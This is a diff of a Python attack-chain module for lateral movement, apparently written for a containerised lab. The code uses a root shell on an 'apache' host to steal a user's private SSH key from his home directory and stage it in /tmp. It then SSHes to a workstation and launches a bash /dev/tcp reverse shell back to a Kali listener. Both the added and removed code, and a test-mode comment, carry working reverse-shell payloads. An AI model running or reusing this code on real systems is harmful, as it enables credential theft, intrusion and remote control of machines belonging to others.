@@ -1,508 +1,276 @@
 import base64
-import os
-import shlex
+import re
 import socket
-import subprocess
 import threading
 import time
-from pathlib import Path
 
 # =============================================================================
-# lateral_movement.py — Lateral Movement via SSH (Apache → Ubuntu Workstation)
-# MITRE ATT&CK: T1021.004 – Remote Services: SSH
-#                T1021.006 – Remote Services: Windows Remote Management
+# lateral_movement.py — Lateral Movement via Stolen Deploy Key
+# MITRE ATT&CK:
+#   T1552.001 – Credentials In Files   (key discovery in john's home on apache)
+#   T1021.004 – Remote Services: SSH   (key-authenticated SSH to workstation)
+#   T1078     – Valid Accounts         (reuse of john.stravidis identity)
 # =============================================================================
 
-# Configuration
-WORKSTATION_IP = "10.30.0.5"
+KALI_HOST        = "10.10.0.2"
+WORKSTATION_IP   = "10.30.0.5"
 WORKSTATION_USER = "john.stravidis"
 WORKSTATION_PORT = 22
-DEFAULT_REVERSE_PORT = 6666
+PORT_JOHN        = 6666
 
-# Will later be imported from config.py:
-#   from config import KALI_HOST, WORKSTATION_IP, WORKSTATION_USER, etc.
-KALI_HOST = "10.10.0.2"
-DEFAULT_PIVOT_KEY_PATH = "/tmp/john_deploy_key"
-
-
-def setup_listener(port=DEFAULT_REVERSE_PORT, timeout=20):
-    """
-    Start a socket listener on the given port to catch reverse shell callbacks.
-
-    Args:
-        port (int):     Port to listen on (default 6666 for lateral movement).
-        timeout (int):  Seconds to wait for connection (default 20).
-
-    Returns:
-        socket: Bound listener socket ready for accept().
-    """
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(("0.0.0.0", port))
-    server.listen(1)
-    print(f"[*] Lateral-movement listener started on port {port}...")
-    server.settimeout(timeout)
-    return server
+DEPLOY_LOG_PATH  = "/opt/waystar-connect/deploy.log"
+REMOTE_KEY_PATH  = "/home/john.stravidis/.ssh/id_ed25519"
+STAGED_KEY_PATH  = "/tmp/john_deploy_key"
 
 
-def _send_shell_command(shell, command):
+def send_command(shell, command):
+    """Send a command through an active shell connection."""
     shell.sendall((command + "\n").encode())
-    time.sleep(0.2)
+    time.sleep(0.5)
 
 
-def _run_pivot_command(shell, command, timeout=8):
-    marker = f"__END_{int(time.time() * 1000)}__"
-    # bash -i echoes every command back through the socket, so the marker text
-    # appears twice: once in the echoed "...; echo <marker>" line and once as
-    # the real output of that echo.  We wait for "\n<marker>\n" which only
-    # matches the real output (on its own line), then strip the echo prefix.
-    actual_marker = "\n" + marker + "\n"
-    echo_suffix = "; echo " + marker
-    wrapped = f"{command}{echo_suffix}"
-    _send_shell_command(shell, wrapped)
+_sentinel_seq = 0
 
+
+def _drain(shell):
+    """Discard stale bytes left in the socket buffer from a previous command."""
+    prev = shell.gettimeout()
+    shell.settimeout(0.1)
+    while True:
+        try:
+            if not shell.recv(4096):
+                break
+        except socket.timeout:
+            break
+    shell.settimeout(prev)
+
+
+def _run_remote(shell, cmd, timeout=10):
+    """
+    Send cmd to shell, collect output, return it.
+
+    Drains stale socket data first, then sends the command and a uniquely-
+    numbered sentinel as two separate lines.  Bash echoes the sentinel line
+    AFTER the command output, so buf[:sentinel_pos] captures the real output.
+    """
+    global _sentinel_seq
+    _sentinel_seq += 1
+    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"
+
+    _drain(shell)
+    shell.sendall(f"{cmd}\n".encode())
+    time.sleep(0.5)
+    shell.sendall(f"echo {sentinel}\n".encode())
+
+    prev_timeout = shell.gettimeout()
+    shell.settimeout(2)
+    buf = ""
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        try:
+            buf += shell.recv(4096).decode(errors="replace")
+        except socket.timeout:
+            pass
+        if sentinel in buf:
+            break
+    shell.settimeout(prev_timeout)
+
+    # The sentinel appears in bash's echo of "echo SENTINEL_..._END".
+    # Everything before that echo is the actual command output (plus prompts).
+    if sentinel in buf:
+        buf = buf[:buf.index(sentinel)]
+
+    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
+    buf = buf.replace("\r", "")
+    return buf.strip()
+
+
+def _stage_key_on_apache(root_shell, key_text):
+    """
+    Write the private key to STAGED_KEY_PATH on apache via the root shell.
+    Uses base64 encoding to avoid shell-quoting issues with PEM newlines.
+    Returns True on success.
+    """
+    key_b64 = base64.b64encode(key_text.encode()).decode()
+    stage_cmd = (
+        f"printf '%s\\n' '{key_b64}' | base64 -d > {STAGED_KEY_PATH} "
+        f"&& chmod 600 {STAGED_KEY_PATH} && echo KEY_OK"
+    )
+    result = _run_remote(root_shell, stage_cmd)
+    return "KEY_OK" in result
+
+
+def _read_id(shell, timeout=10):
+    """Send 'id' and return the response string."""
+    send_command(shell, "id")
+    shell.settimeout(5)
     response = ""
     deadline = time.time() + timeout
-    prev_timeout = shell.gettimeout()
-    shell.settimeout(0.5)
-
-    try:
-        while time.time() < deadline:
-            try:
-                chunk = shell.recv(4096).decode(errors="replace")
-            except socket.timeout:
-                continue
-            if not chunk:
-                continue
-            response += chunk
-            if actual_marker in response:
-                break
-    finally:
-        shell.settimeout(prev_timeout)
-
-    if actual_marker in response:
-        # Split off everything after the real marker, then strip the echoed
-        # command prefix (everything up to and including "; echo <marker>").
-        pre_marker = response.split(actual_marker)[0]
-        if echo_suffix in pre_marker:
-            return pre_marker.split(echo_suffix)[-1].lstrip("\n")
-        return pre_marker
-    if marker in response:
-        # Fallback: no bash echo (non-interactive context), marker found once.
-        return response.split(marker)[0]
+    while time.time() < deadline:
+        try:
+            chunk = shell.recv(1024).decode(errors="replace")
+            if chunk:
+                response += chunk
+                if "uid=" in response:
+                    break
+        except socket.timeout:
+            break
     return response
 
 
-def _extract_uid_line(output):
-    for line in output.splitlines():
-        if "uid=" in line:
-            return line.strip()
-    return ""
-
-
-def _build_ssh_command_string(key_path, user, host, port, remote_cmd, ssh_bin="ssh"):
-    parts = [
-        ssh_bin,
-        "-i",
-        key_path,
-        "-o",
-        "StrictHostKeyChecking=accept-new",
-        "-o",
-        "UserKnownHostsFile=/dev/null",
-        "-o",
-        "ConnectTimeout=10",
-        "-o",
-        "BatchMode=yes",
-        "-p",
-        str(port),
-        f"{user}@{host}",
-        remote_cmd,
-    ]
-    return " ".join(shlex.quote(part) for part in parts)
-
-
-def _stage_key_via_pivot(shell, local_key_path, remote_key_path):
-    # Remove any pre-existing file that might be owned by a different uid and
-    # would block the redirect even for root (Docker user-namespace edge case).
-    _run_pivot_command(shell, f"rm -f {shlex.quote(remote_key_path)}", timeout=3)
-    base64_check = _run_pivot_command(
-        shell,
-        "for b in /usr/bin/base64 /bin/base64; do [ -x \"$b\" ] && echo \"BASE64_OK $b\" && break; done",
-        timeout=2,
+def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
+                        workstation_port, kali_host, kali_port):
+    """
+    SSH from apache to workstation and trigger a reverse bash shell back to kali.
+    Runs in a background thread — the connection stays open while the shell lives.
+    """
+    ssh_cmd = (
+        f"ssh -i {STAGED_KEY_PATH} "
+        f"-o StrictHostKeyChecking=accept-new "
+        f"-o UserKnownHostsFile=/dev/null "
+        f"-p {workstation_port} "
+        f"{workstation_user}@{workstation_ip} "
+        f'"bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1" '
+        f">/dev/null 2>&1"
     )
-    if "BASE64_OK" in base64_check:
-        b64_bin = base64_check.split("BASE64_OK ")[-1].split()[0].strip()
-        key_b64 = base64.b64encode(Path(local_key_path).read_bytes()).decode()
-        cmd = (
-            f"printf %s {shlex.quote(key_b64)} | {b64_bin} -d > {shlex.quote(remote_key_path)} "
-            f"&& chmod 600 {shlex.quote(remote_key_path)} "
-            f"&& test -s {shlex.quote(remote_key_path)} && echo KEY_OK"
-        )
-        output = _run_pivot_command(shell, cmd, timeout=6)
-    else:
-        key_text = Path(local_key_path).read_text()
-        heredoc = (
-            f"cat > {shlex.quote(remote_key_path)} <<'EOF'\n"
-            f"{key_text}\n"
-            "EOF\n"
-            f"chmod 600 {shlex.quote(remote_key_path)}\n"
-            f"test -s {shlex.quote(remote_key_path)} && echo KEY_OK"
-        )
-        output = _run_pivot_command(shell, heredoc, timeout=8)
-
-    if "KEY_OK" in output:
-        return True
-    trimmed = " ".join(output.split())
-    if trimmed:
-        print(f"[-] Key staging output: {trimmed[:200]}")
-    return False
+    send_command(root_shell, ssh_cmd)
 
 
-def inject_reverse_shell(
-    workstation_ip,
-    workstation_user,
-    deploy_key_file,
-    kali_host,
-    kali_port,
-    workstation_port=22,
-):
+def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
+        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT):
     """
-    Execute a reverse-shell payload over SSH using subprocess.
+    Execute the lateral-movement step.
 
     Args:
-        workstation_ip (str):   IP address of workstation.
-        workstation_user (str): Username for SSH.
-        deploy_key_file (str):  Path to SSH private key.
-        kali_host (str):        IP address of Kali listener.
-        kali_port (int):        Port of Kali listener.
-        workstation_port (int): SSH port.
+        root_shell (socket):    root shell on apache (from privesc step).
+        kali_host (str):        kali IP for reverse-shell callback.
+        workstation_ip (str):   target workstation IP.
+        workstation_user (str): SSH username on workstation.
+        workstation_port (int): SSH port on workstation.
 
     Returns:
-        bool: True if command was sent successfully, False otherwise.
-    """
-    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1'"
-
-    print(f"[*] Injecting reverse shell to {kali_host}:{kali_port}...")
-
-    try:
-        # Build SSH command with key authentication
-        ssh_cmd = [
-            "ssh",
-            "-i",
-            deploy_key_file,
-            "-o",
-            "StrictHostKeyChecking=accept-new",
-            "-o",
-            "UserKnownHostsFile=/dev/null",
-            "-o",
-            "ConnectTimeout=10",
-            "-p",
-            str(workstation_port),
-            f"{workstation_user}@{workstation_ip}",
-            payload,
-        ]
-
-        # Non-blocking execution — reverse shell hijacks the connection
-        subprocess.Popen(
-            ssh_cmd,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            stdin=subprocess.DEVNULL,
-        )
-        return True
-    except Exception as e:
-        print(f"[-] Error injecting reverse shell: {e}")
-        return False
-
-
-def validate_ssh_key(key_file):
-    """
-    Validate SSH private key file exists and has appropriate permissions.
-
-    Args:
-        key_file (str): Path to the private key file.
-
-    Returns:
-        bool: True if key exists and is readable, False otherwise.
-    """
-    try:
-        key_path = Path(key_file)
-        if not key_path.exists():
-            print(f"[-] Key file not found: {key_file}")
-            return False
-
-        # Check file permissions — warn if world-readable but allow for lab
-        stat_info = key_path.stat()
-        mode = stat_info.st_mode & 0o777
-        if mode & 0o077:  # Check if group or others have any permissions
-            print(f"[!] Warning: key file has loose permissions ({oct(mode)})")
-
-        if not os.access(key_file, os.R_OK):
-            print(f"[-] Key file is not readable: {key_file}")
-            return False
-
-        print(f"[+] Key file validated: {key_file}")
-        return True
-    except Exception as e:
-        print(f"[-] Error validating key: {e}")
-        return False
-
-
-def verify_ssh_connection(
-    workstation_ip, workstation_user, deploy_key_file, workstation_port=22
-):
-    """
-    Execute a lightweight verification command to confirm foothold.
-
-    Args:
-        workstation_ip (str):   IP address of workstation.
-        workstation_user (str): Username for SSH.
-        deploy_key_file (str):  Path to SSH private key.
-        workstation_port (int): SSH port.
-
-    Returns:
-        str: Command output (id output), or empty string on failure.
-    """
-    try:
-        ssh_cmd = [
-            "ssh",
-            "-i",
-            deploy_key_file,
-            "-o",
-            "StrictHostKeyChecking=accept-new",
-            "-o",
-            "UserKnownHostsFile=/dev/null",
-            "-o",
-            "ConnectTimeout=10",
-            "-p",
-            str(workstation_port),
-            f"{workstation_user}@{workstation_ip}",
-            "id",
-        ]
-
-        result = subprocess.run(ssh_cmd, capture_output=True, timeout=15, text=True)
-
-        if result.returncode == 0:
-            return result.stdout
-        else:
-            print(f"[!] SSH command returned {result.returncode}")
-            if result.stderr:
-                print(f"[!] stderr: {result.stderr[:100]}")
-            return ""
-    except subprocess.TimeoutExpired:
-        print("[-] SSH verification timeout")
-        return ""
-    except Exception as e:
-        print(f"[-] Error verifying connection: {e}")
-        return ""
-
-
-def verify_ssh_connection_via_pivot(
-    pivot_shell,
-    workstation_ip,
-    workstation_user,
-    key_path,
-    workstation_port=22,
-):
-    try:
-        ssh_cmd = _build_ssh_command_string(
-            key_path,
-            workstation_user,
-            workstation_ip,
-            workstation_port,
-            "id",
-            ssh_bin="/usr/bin/ssh",
-        )
-        output = _run_pivot_command(pivot_shell, ssh_cmd, timeout=12)
-        uid_line = _extract_uid_line(output)
-        if uid_line:
-            return uid_line
-        trimmed = " ".join(output.split())
-        if trimmed:
-            print(f"[!] Pivot SSH output: {trimmed[:200]}")
-        return ""
-    except Exception as e:
-        print(f"[-] Error verifying connection via pivot: {e}")
-        return ""
-
-
-def inject_reverse_shell_via_pivot(
-    pivot_shell,
-    workstation_ip,
-    workstation_user,
-    key_path,
-    kali_host,
-    kali_port,
-    workstation_port=22,
-):
-    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1'"
-    ssh_cmd = _build_ssh_command_string(
-        key_path,
-        workstation_user,
-        workstation_ip,
-        workstation_port,
-        payload,
-        ssh_bin="/usr/bin/ssh",
-    )
-    fire_cmd = f"nohup {ssh_cmd} >/dev/null 2>&1 &"
-    _run_pivot_command(pivot_shell, fire_cmd, timeout=2)
-
-
-def run(
-    deploy_key_file,
-    workstation_ip=WORKSTATION_IP,
-    workstation_user=WORKSTATION_USER,
-    workstation_port=WORKSTATION_PORT,
-    kali_host=KALI_HOST,
-    kali_port=DEFAULT_REVERSE_PORT,
-    pivot_shell=None,
-    pivot_key_path=DEFAULT_PIVOT_KEY_PATH,
-):
-    """
-    Execute the lateral-movement step: SSH into the workstation and establish
-    both an interactive session verification and a reverse-shell fallback.
-
-    Args:
-        deploy_key_file (str):  Path to john.stravidis's Ed25519 private key.
-        workstation_ip (str):   IP address of the workstation (default 10.30.0.5).
-        workstation_user (str): Username to authenticate as (default john.stravidis).
-        workstation_port (int): SSH port (default 22).
-        kali_host (str):        IP address of Kali listener for reverse shell.
-        kali_port (int):        Port of Kali listener (default 6666).
-
-    Returns:
-        dict: Status dictionary with keys:
-            - 'success' (bool): Overall success.
-            - 'reverse_shell' (socket): Reverse-shell socket, or None.
-            - 'verification' (str): Output of 'id' command confirming foothold.
+        socket: reverse shell as john.stravidis on the workstation, or None.
     """
     print("\n[*] Starting lateral movement to workstation...")
 
-    result = {
-        "success": False,
-        "reverse_shell": None,
-        "verification": "",
-    }
+    # ------------------------------------------------------------------
+    # Phase 1 — Credential discovery: deploy.log + private key on apache
+    # ------------------------------------------------------------------
+    print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
+    log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
 
-    # Step 1: Validate the deploy key
-    print(f"[*] Validating deploy key from {deploy_key_file}...")
-    if not validate_ssh_key(deploy_key_file):
-        print("[-] Deploy key validation failed")
-        return result
+    match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
+    if match:
+        workstation_user = match.group(1)
+        workstation_ip   = match.group(2)
+        print(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
+    else:
+        print(f"[!] Could not parse deploy.log; using defaults "
+              f"({workstation_user}@{workstation_ip})")
 
-    # Step 2: Prepare the reverse-shell listener
-    listener_timeout = 5 if pivot_shell is not None else 20
-    server_socket = setup_listener(kali_port, timeout=listener_timeout)
+    print(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
+    raw_key = _run_remote(root_shell, f"cat {REMOTE_KEY_PATH}", timeout=10)
 
-    # Step 3: Verify SSH connectivity with a lightweight command
+    key_start = raw_key.find("-----BEGIN OPENSSH PRIVATE KEY-----")
+    key_end   = raw_key.find("-----END OPENSSH PRIVATE KEY-----")
+    if key_start < 0 or key_end < 0:
+        print(f"[-] Private key not found at {REMOTE_KEY_PATH}")
+        return None
+    key_text = raw_key[key_start:key_end + len("-----END OPENSSH PRIVATE KEY-----")] + "\n"
+    print("[+] Deploy key retrieved")
+
+    # ------------------------------------------------------------------
+    # Phase 2 — Stage key on apache, pre-verify SSH connectivity
+    # ------------------------------------------------------------------
+    print(f"[*] Staging key at {STAGED_KEY_PATH} on apache...")
+    if not _stage_key_on_apache(root_shell, key_text):
+        print("[-] Failed to stage deploy key on apache")
+        return None
+    print("[+] Key staged successfully")
+
     print(f"[*] Verifying SSH connectivity to {workstation_user}@{workstation_ip}...")
-    if pivot_shell is not None:
-        print("[*] Using Apache pivot shell for lateral SSH...")
-        sanity = _run_pivot_command(
-            pivot_shell,
-            "test -x /usr/bin/ssh && echo SSH_OK || echo SSH_MISSING; "
-            "{ test -x /usr/bin/base64 || test -x /bin/base64; } && echo BASE64_OK || echo BASE64_MISSING",
-            timeout=3,
-        )
-        if "SSH_MISSING" in sanity:
-            print("[-] Pivot shell missing /usr/bin/ssh")
-        if "BASE64_MISSING" in sanity:
-            print("[-] Pivot shell missing base64 (checked /usr/bin/base64 and /bin/base64)")
-        if not _stage_key_via_pivot(pivot_shell, deploy_key_file, pivot_key_path):
-            print("[-] Failed to stage deploy key on Apache")
-            server_socket.close()
-            return result
-        verification = verify_ssh_connection_via_pivot(
-            pivot_shell,
-            workstation_ip,
-            workstation_user,
-            pivot_key_path,
-            workstation_port,
-        )
-    else:
-        verification = verify_ssh_connection(
-            workstation_ip, workstation_user, deploy_key_file, workstation_port
-        )
+    verify_out = _run_remote(
+        root_shell,
+        f"ssh -i {STAGED_KEY_PATH} "
+        f"-o StrictHostKeyChecking=accept-new "
+        f"-o UserKnownHostsFile=/dev/null "
+        f"-o ConnectTimeout=8 "
+        f"-p {workstation_port} "
+        f"{workstation_user}@{workstation_ip} id",
+        timeout=15,
+    )
+    if "uid=" not in verify_out:
+        print(f"[-] SSH pre-check failed. Output: {verify_out!r}")
+        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
+        return None
+    print(f"[+] SSH pre-check passed: {verify_out.strip()}")
 
-    if "uid=" in verification:
-        print(f"[+] SSH verification successful:")
-        print(f"    {verification.strip()}")
-        result["verification"] = verification.strip()
-    else:
-        print("[-] SSH verification failed")
-        print("    → Check SSH connectivity: ssh -i <key> john.stravidis@10.30.0.5")
-        print("    → Check key permissions: ls -la <key>")
-        print("    → Check workstation is up: docker exec ubuntu_workstation id")
-        server_socket.close()
-        return result
+    # ------------------------------------------------------------------
+    # Phase 3 — Set up listener and trigger reverse shell
+    # ------------------------------------------------------------------
+    john_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    john_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    john_server.bind(("0.0.0.0", PORT_JOHN))
+    john_server.listen(1)
+    print(f"[*] Waiting for john.stravidis shell on port {PORT_JOHN}...")
 
-    # Step 4: Inject reverse shell in background (best-effort)
-    if pivot_shell is not None:
-        inject_reverse_shell_via_pivot(
-            pivot_shell,
-            workstation_ip,
-            workstation_user,
-            pivot_key_path,
-            kali_host,
-            kali_port,
-            workstation_port,
-        )
-    else:
-        inject_thread = threading.Thread(
-            target=inject_reverse_shell,
-            args=(
-                workstation_ip,
-                workstation_user,
-                deploy_key_file,
-                kali_host,
-                kali_port,
-                workstation_port,
-            ),
-            daemon=True,
-        )
-        inject_thread.start()
+    t = threading.Thread(
+        target=_fire_reverse_shell,
+        args=(root_shell, workstation_user, workstation_ip,
+              workstation_port, kali_host, PORT_JOHN),
+        daemon=True,
+    )
+    t.start()
 
-    # Step 5: Wait for reverse-shell callback after the payload has been sent.
+    john_server.settimeout(20)
     try:
-        reverse_shell, addr = server_socket.accept()
-        print(f"[+] Reverse shell received from {addr[0]}")
-        result["reverse_shell"] = reverse_shell
-        print(f"[+] Lateral movement successful!")
+        john_shell, addr = john_server.accept()
+        print(f"[+] Shell received from {addr[0]}")
     except socket.timeout:
-        print(
-            "[-] Reverse shell timeout (SSH verification succeeded, but reverse shell didn't callback)"
-        )
-        print(
-            "    → SSH foothold is still valid; proceed with interactive SSH if needed"
-        )
+        print("[-] Timeout — no shell received from workstation")
+        print("    → check workstation can reach kali: route -n")
+        print(f"    → check ssh works manually: ssh -i {STAGED_KEY_PATH} "
+              f"{workstation_user}@{workstation_ip}")
+        return None
     finally:
-        result["success"] = bool(result["verification"])
-        server_socket.close()
+        john_server.close()
 
-    return result
+    # ------------------------------------------------------------------
+    # Phase 4 — Confirm identity + clean up staged key
+    # ------------------------------------------------------------------
+    time.sleep(1)
+    response = _read_id(john_shell)
+
+    if "john.stravidis" in response:
+        print("[+] Lateral movement successful!")
+        print(f"[+] {response.strip()}")
+    else:
+        print("[-] john.stravidis not confirmed in id output")
+        print(f"[?] Response: {response!r}")
+
+    send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
+    print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
+
+    return john_shell
 
 
 # Test mode — not executed when imported by main.py.
-# To test manually:
-#   1. Copy john_deploy_key to /tmp/john_deploy_key
-#   2. Start a listener: nc -lvnp 6666
-#   3. Run: python lateral_movement.py /tmp/john_deploy_key <workstation_ip> <kali_ip>
+# Usage: docker compose exec kali python3 /Attack-chain/lateral_movement.py
+# Then in another terminal:
+#   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
 if __name__ == "__main__":
-    import sys
+    print("[*] Test mode — waiting for root shell on port 5555")
 
-    if len(sys.argv) < 2:
-        print(
-            "Usage: python lateral_movement.py <deploy_key_file> [workstation_ip] [kali_host]"
-        )
-        sys.exit(1)
+    test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    test_server.bind(("0.0.0.0", 5555))
+    test_server.listen(1)
 
-    deploy_key = sys.argv[1]
-    ws_ip = sys.argv[2] if len(sys.argv) > 2 else WORKSTATION_IP
-    k_host = sys.argv[3] if len(sys.argv) > 3 else KALI_HOST
+    try:
+        root_shell_sock, addr = test_server.accept()
+        print(f"[+] Root shell received from {addr[0]}")
+    finally:
+        test_server.close()
 
-    result = run(deploy_key, workstation_ip=ws_ip, kali_host=k_host)
-
-    print("\n[*] Result summary:")
-    print(f"    Success: {result['success']}")
-    print(f"    Reverse Shell: {result['reverse_shell'] is not None}")
-    print(f"    Verification: {result['verification']}")
+    result = run(root_shell_sock)
+    print(f"\n[*] Result: {'success — john.stravidis shell active' if result else 'failed'}")
